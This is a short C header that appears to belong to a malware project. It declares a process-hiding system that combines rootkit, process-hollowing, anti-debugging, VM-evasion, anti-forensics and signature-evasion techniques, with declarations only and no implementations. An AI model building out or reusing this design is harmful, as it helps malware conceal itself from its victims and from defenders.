#pragma once

#include "includes.h"
#include "stealth.h"
#include "rootkit.h"
#include "hollowing.h"

// Comprehensive process hiding system
#define PROCESS_HIDING_MAX_TECHNIQUES 20
#define PROCESS_HIDING_UPDATE_INTERVAL 30

// Process hiding state
typedef struct {
    BOOL stealth_active;
    BOOL rootkit_active;
    BOOL hollowing_active;
    BOOL anti_debug_active;
    BOOL vm_evasion_active;
    BOOL memory_protection_active;
    time_t last_update;
    int technique_counter;
} process_hiding_state_t;

// Function declarations
void process_hiding_init(void);
void process_hiding_activate_all(void);
void process_hiding_update(void);
void process_hiding_cleanup(void);
void process_hiding_emergency_hide(void);

// Internal functions
static void process_hiding_rotate_techniques(void);
static void process_hiding_anti_forensics(void);
static void process_hiding_anti_analysis(void);
static void process_hiding_network_stealth(void);
static void process_hiding_memory_stealth(void);
static void process_hiding_file_stealth(void);
static void process_hiding_behavioral_stealth(void);
static void process_hiding_signature_evasion(void);
static void process_hiding_timing_evasion(void);
static void process_hiding_resource_evasion(void);
